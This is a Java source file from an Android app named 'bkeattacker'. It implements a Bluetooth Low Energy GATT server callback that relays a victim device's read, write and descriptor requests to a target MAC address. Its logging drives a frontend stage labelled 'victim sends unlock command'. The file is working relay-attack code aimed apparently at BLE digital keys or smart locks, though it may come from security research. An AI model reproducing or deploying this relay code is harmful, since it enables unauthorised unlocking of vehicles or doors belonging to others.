package com.example.bkeattacker;

import android.annotation.SuppressLint;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCharacteristic;
import android.bluetooth.BluetoothGattDescriptor;
import android.bluetooth.BluetoothGattServer;
import android.bluetooth.BluetoothGattServerCallback;
import android.bluetooth.BluetoothGattService;
import android.bluetooth.BluetoothProfile;
import android.content.pm.PackageManager;
import android.util.Log;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.fragment.app.Fragment;
import com.example.bkeattacker.utils.Conversion;
import com.example.bkeattacker.responseData.*;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ServerCallback extends BluetoothGattServerCallback {

    private static final String TAG = "ServerCallback";

    public void setBluetoothGattServer(BluetoothGattServer bluetoothGattServer) {
        this.bluetoothGattServer = bluetoothGattServer;
    }

    private BluetoothGattServer bluetoothGattServer;

    private final CountDownLatch servicesDiscoveredLatch = new CountDownLatch(1);
    private final ExecutorService discoveryExecutor = Executors.newSingleThreadExecutor();

    public String getTargetMac() {
        return targetMac;
    }

    public void setTargetMac(String targetMac) {
        this.targetMac = targetMac;
    }

    private String targetMac = "";

    // Response context holders (used by the external ServerImpl)
    private ReadCharacteristicResponse readCharacteristicResponse = null;
    private WriteCharacteristicResponse writeCharacteristicResponse = null;
    private ReadDescriptorResponse readDescriptorResponse = null;
    private WriteDescriptorResponse writeDescriptorResponse = null;

    // Subscription status
    private HashMap<BluetoothDevice, byte[]> clientSubscriptions = new HashMap<>();

    // Device and characteristic mapping (optional)
    public Map<String, BluetoothDevice> connectedDevices = new HashMap<>();
    public Map<String, BluetoothGattCharacteristic> characteristicMap = new HashMap<>();

    public ServerCallback() {}

    // —————— Setter for response context holders ——————
    public void setReadCharacteristicResponse(ReadCharacteristicResponse readCharacteristicResponse) {
        this.readCharacteristicResponse = readCharacteristicResponse;
    }

    public void setWriteCharacteristicResponse(WriteCharacteristicResponse writeCharacteristicResponse) {
        this.writeCharacteristicResponse = writeCharacteristicResponse;
    }

    public void setReadDescriptorResponse(ReadDescriptorResponse readDescriptorResponse) {
        this.readDescriptorResponse = readDescriptorResponse;
    }

    public void setWriteDescriptorResponse(WriteDescriptorResponse writeDescriptorResponse) {
        this.writeDescriptorResponse = writeDescriptorResponse;
    }

    public void setClientSubscriptions(HashMap<BluetoothDevice, byte[]> clientSubscriptions) {
        this.clientSubscriptions = clientSubscriptions;
    }

    public void setConnectedDevices(Map<String, BluetoothDevice> connectedDevices) {
        this.connectedDevices = connectedDevices;
    }

    public void setCharacteristicMap(Map<String, BluetoothGattCharacteristic> characteristicMap) {
        this.characteristicMap = characteristicMap;
    }

    // —————— BLE Callbacks ——————

    @Override
    public void onConnectionStateChange(BluetoothDevice device, int status, int newState) {
        //String address = device.getAddress();
        String address = getTargetMac();
        connectedDevices.put(address, device);

        if (newState == BluetoothProfile.STATE_CONNECTED) {
            log("Remote GATT Client Connected: " + address);
            ClientStub.connectGatt(address);

        } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
            log("Remote GATT Client Disconnected: " + address);
            connectedDevices.remove(address);
        }
    }

    @Override
    public void onCharacteristicReadRequest(BluetoothDevice device, int requestId, int offset,
                                            BluetoothGattCharacteristic characteristic) {
        BluetoothGattService service = characteristic.getService();
        String serviceUuid = service.getUuid().toString();
        String charUuid = characteristic.getUuid().toString();

        // Save context for ServerImpl to respond
        if (readCharacteristicResponse != null) {
            readCharacteristicResponse.setValue(device, requestId, offset);
        }

        log("onCharacteristicReadRequest: service=" + serviceUuid + ", char=" + charUuid);

        ClientStub.readCharacteristic(serviceUuid, charUuid);
    }

    @Override
    public void onCharacteristicWriteRequest(BluetoothDevice device, int requestId,
                                             BluetoothGattCharacteristic characteristic,
                                             boolean preparedWrite, boolean responseNeeded,
                                             int offset, byte[] value) {
        String serviceUuid = characteristic.getService().getUuid().toString();
        String charUuid = characteristic.getUuid().toString();
        int writeType = responseNeeded
                ? BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT
                : BluetoothGattCharacteristic.WRITE_TYPE_NO_RESPONSE;
        // Only save context when a response is needed (but write requests may also need an ACK)
        if (responseNeeded && writeCharacteristicResponse != null) {
            writeCharacteristicResponse.setValue(device, requestId, offset);
        }

        log("onCharacteristicWriteRequest: service=" + serviceUuid +
                ", char=" + charUuid +
                ", data=" + Conversion.Bytes2HexString(value));

        ClientStub.writeCharacteristic(serviceUuid, charUuid, writeType, value);
    }

    @Override
    public void onDescriptorReadRequest(BluetoothDevice device, int requestId, int offset,
                                        BluetoothGattDescriptor descriptor) {
        BluetoothGattCharacteristic characteristic = descriptor.getCharacteristic();
        String serviceUuid = characteristic.getService().getUuid().toString();
        String charUuid = characteristic.getUuid().toString();
        String descUuid = descriptor.getUuid().toString();

        if (readDescriptorResponse != null) {
            readDescriptorResponse.setValue(device, requestId, offset);
        }

        log("onDescriptorReadRequest: service=" + serviceUuid +
                ", char=" + charUuid +
                ", desc=" + descUuid);

        ClientStub.readDescriptor(serviceUuid, charUuid, descUuid);
    }


//    public void onDescriptorWriteRequest(BluetoothDevice device, int requestId,
//                                         BluetoothGattDescriptor descriptor,
//                                         boolean preparedWrite, boolean responseNeeded,
//                                         int offset, byte[] value) {
//        BluetoothGattCharacteristic characteristic = descriptor.getCharacteristic();
//        String serviceUuid = characteristic.getService().getUuid().toString();
//        String charUuid = characteristic.getUuid().toString();
//        String descUuid = descriptor.getUuid().toString();
//
//        // Save subscription status
//        clientSubscriptions.put(device, value);
//
//        if (responseNeeded && writeDescriptorResponse != null) {
//            writeDescriptorResponse.setValue(device, requestId, offset);
//        }
//
//        log("onDescriptorWriteRequest: service=" + serviceUuid +
//                ", char=" + charUuid +
//                ", desc=" + descUuid +
//                ", value=" + Conversion.Bytes2HexString(value));
//
//        ClientStub.writeDescriptor(serviceUuid, charUuid, descUuid, value);
//
//        // Check if notification/indication is enabled
//        if (Arrays.equals(value, BluetoothGattDescriptor.ENABLE_INDICATION_VALUE)) {
//            ClientStub.setCharacteristicNotification(serviceUuid, charUuid, 1);
//        } else if (Arrays.equals(value, BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE)) {
//            ClientStub.setCharacteristicNotification(serviceUuid, charUuid, 1);
//        }
//    }
    @SuppressLint("MissingPermission")
    @Override
    public void onDescriptorWriteRequest(BluetoothDevice device, int requestId,
                                         BluetoothGattDescriptor descriptor,
                                         boolean preparedWrite, boolean responseNeeded,
                                         int offset, byte[] value) {

        // The following is the original processing logic for non-CCCD descriptors (remains unchanged)
        BluetoothGattCharacteristic characteristic = descriptor.getCharacteristic();
        String serviceUuid = characteristic.getService().getUuid().toString();
        String charUuid = characteristic.getUuid().toString();
        String descUuid = descriptor.getUuid().toString();

        clientSubscriptions.put(device, value);

        if (responseNeeded && writeDescriptorResponse != null) {
            writeDescriptorResponse.setValue(device, requestId, offset);
        }

        log("onDescriptorWriteRequest: service=" + serviceUuid +
                ", char=" + charUuid +
                ", desc=" + descUuid +
                ", value=" + Conversion.Bytes2HexString(value));

        ClientStub.writeDescriptor(serviceUuid, charUuid, descUuid, value);
    }

    // —————— Logging ——————
    private void log(String message) {
        Log.d(TAG, message);
        WebLogManager.get().log(message, WebLogManager.LOG_RECV);
        // Trigger the frontend to enter the "victim sends unlock command" stage (p6)
        WebLogManager.get().callJs("window.enterVictimSendStage && window.enterVictimSendStage();");
    }
}